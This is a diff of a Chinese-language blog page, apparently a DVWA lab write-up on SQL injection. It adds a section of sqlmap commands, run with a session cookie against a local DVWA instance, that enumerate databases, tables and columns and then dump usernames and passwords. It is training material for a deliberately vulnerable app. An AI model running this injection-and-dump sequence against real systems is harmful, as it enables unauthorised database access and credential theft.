@@ -265,7 +265,8 @@
 <hr>
 <p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
 <hr>
-<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><ul>
+<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><hr>
+<h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><ul>
 <li><p>判断是否存在注入，注入是<strong>字符型</strong>还是<strong>数字型</strong></p>
 <p>字符型和数字型的区别在于是否存在引号，所以我们输入 <strong>1</strong>  进行注入</p>
 <p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
@@ -323,8 +324,42 @@
 </li>
 </ul>
 <hr>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><hr>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><hr>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><hr>
+<h2 id="sqlmap-注入"><a href="#sqlmap-注入" class="headerlink" title="sqlmap 注入"></a>sqlmap 注入</h2><hr>
+<h3 id="Low-amp-amp-Medium"><a href="#Low-amp-amp-Medium" class="headerlink" title="Low &amp;&amp; Medium"></a>Low &amp;&amp; Medium</h3><p>Low 和 Medium 是一样的，把 cookie 改一下就行，这里演示以 low 为例。</p>
+<ul>
+<li>检测是否存在SQL注入漏洞</li>
+</ul>
+<p>需要注意的点：dvwa需要登录才能访问漏洞测试页面，所以使用sqlmap时需要提交登录后的cookie</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/10.png" alt="10"></p>
+<p>检测存在SQL注入点id(GET),数据库类型为mysql。</p>
+<ul>
+<li><p>爆数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/11.png" alt="11"></p>
+</li>
+<li><p>爆数据表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/12.png" alt="12"></p>
+</li>
+<li><p>爆字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -T users -columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/13.png" alt="13"></p>
+</li>
+<li><p>爆字段内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -T users -C <span class="string">&quot;user,password&quot;</span> -dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/14.png" alt="14"></p>
+</li>
+</ul>
+<hr>
+<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3>
         </div>
 
         
